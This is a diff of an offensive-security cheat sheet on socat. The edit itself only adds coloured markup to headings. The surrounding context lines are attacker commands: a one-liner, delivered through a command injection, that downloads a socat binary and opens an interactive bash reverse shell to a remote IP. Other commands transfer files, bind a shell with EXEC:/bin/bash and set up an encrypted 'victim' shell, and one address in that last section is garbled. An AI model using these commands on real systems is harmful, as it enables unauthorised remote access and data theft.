@@ -1,6 +1,6 @@
 # socat
 
-## Deployment
+## <mark style="color:red;">Deployment</mark>
 
 If socat isn’t installed, you’re not out of luck. There are standalone binaries that can be downloaded from this awesome Github repo:\
 \
@@ -12,28 +12,28 @@ With a command injection vuln, it’s possible to download the correct architect
 wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 ```
 
-## connect
+## <mark style="color:red;">connect</mark>
 
 ```
 socat - TCP4:[ip]:[port] 
 socat TCP4-LISTEN:[port] STDOUT
 ```
 
-## file transfer
+## <mark style="color:red;">file transfer</mark>
 
 ```
 sudo socat TCP4-LISTEN:443,fork file:file.txt
 socat TCP4:18.11.8.4:443 file:file.txt,create
 ```
 
-## shell
+## <mark style="color:red;">shell</mark>
 
 ```
 socat -d -d TCP4-LISTEN:443 STDOUT
 socat TCP4:18.11.8.22:443 EXEC:/bin/bash
 ```
 
-### ssh shell
+### <mark style="color:orange;">ssh shell</mark>
 
 create a cert with openssl:
 
@@ -68,7 +68,7 @@ victim:
 socat - OPENSSL:1e.11. e .4:443,verify=8
 ```
 
-### intractive shell
+### <mark style="color:orange;">intractive shell</mark>
 
 ```
 socat file:`tty`,raw,echo=0 tcp-listen:4444 → attacker
